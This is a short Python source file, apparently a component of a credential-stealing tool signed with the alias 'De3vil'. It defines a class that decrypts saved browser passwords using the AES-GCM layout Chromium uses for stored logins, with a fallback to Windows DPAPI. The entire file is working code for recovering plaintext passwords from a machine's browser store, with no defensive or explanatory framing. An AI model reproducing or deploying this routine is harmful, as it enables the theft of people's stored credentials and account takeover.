
# -*- coding: utf-8 -*-
# Author: Abdulrahman Mohammed (De3vil)
# Don't touch my code, it's art 
#+==============================

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
class DecryptPassword:
    def __init__(self):
        pass
    def decrypt_password(self,password,key):
        try:
            En_pass  =   password[3:15]
            password =   password[15:]
            cipher   =   AES.new(key, AES.MODE_GCM, En_pass)
            #=================================================#
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return None